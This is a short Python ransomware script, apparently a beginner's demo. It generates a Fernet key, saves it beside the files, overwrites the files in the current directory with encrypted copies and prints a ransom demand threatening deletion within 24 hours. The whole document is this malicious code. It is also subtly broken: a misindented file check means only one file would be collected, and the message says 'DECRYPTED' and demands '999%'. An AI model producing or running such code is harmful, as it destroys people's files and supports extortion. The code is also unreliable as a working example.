import os
from cryptography.fernet import Fernet
files=[]

for file in os.listdir():

    if file=="lock.py" or file=="decrypt.key" or file=="unlock.py":

        continue

if os. path. isfile(file):
    files. append(file)

print(files)

key=Fernet.generate_key()

with open("decrypt.key","wb") as key1:
    key1.write(key)

for file in files:
    with open(file,"rb") as file1:
        contents=file1. read()
    contents_encrypt=Fernet (key).encrypt (contents)
    with open(file, "wb") as file1:
        file1.write(contents_encrypt)

print("ALL OF YOUR FILES HAVE BEEN DECRYPTED. SEND ME 999% OR I'LL DELETE THEM IN 24 HRS.")
